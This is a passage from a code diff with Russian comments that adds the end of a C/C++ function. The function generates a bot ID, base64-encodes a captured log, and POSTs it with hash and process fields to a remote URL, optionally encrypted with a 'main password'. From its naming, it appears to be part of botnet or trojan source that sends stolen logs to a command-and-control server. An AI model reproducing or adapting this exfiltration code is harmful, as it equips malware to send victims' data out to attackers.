+	PCHAR ID      = GenerateBotID();
+	PCHAR LogStr  = BASE64::Encode((LPBYTE)Log, LogLen);
+
+	// Заполняем поля
+	PStrings Fields = Strings::Create();
+
+	AddURLParam(Fields, FieldID, ID);
+	AddURLParam(Fields, FieldType, "2");
+	AddURLParam(Fields, FieldHash, HashStr);
+	AddURLParam(Fields, FieldSHash, PidStr);
+	AddURLParam(Fields, FieldLog, LogStr);
+
+	// Отправляем запрос
+	bool Result = false;
+
+	THTTPResponse Response;
+    ClearStruct(Response);
+
+	#ifdef CryptHTTPH
+		PCHAR Password = GetMainPassword(false);
+
+		Result = CryptHTTP::Post(URL, Password, Fields, NULL, &Response, false);
+
+		STR::Free(Password);
+	#else
+    	Result = HTTP::Post(URL, Fields, NULL, &Response);
+	#endif
+
+	if (Result)
+		Result = CheckValidPostResult(&Response, NULL);
+
+	HTTPResponse::Clear(&Response);
+
+	// Освобождаем данные
+	if (FreeURL)
+    	STR::Free(URL);
+	STR::Free(HashStr);
+	STR::Free(PidStr);
+	STR::Free(ID);
+	STR::Free(LogStr);
+	Strings::Free(Fields);
+
+	return Result;
+}
+//----------------------------------------------------------------------------
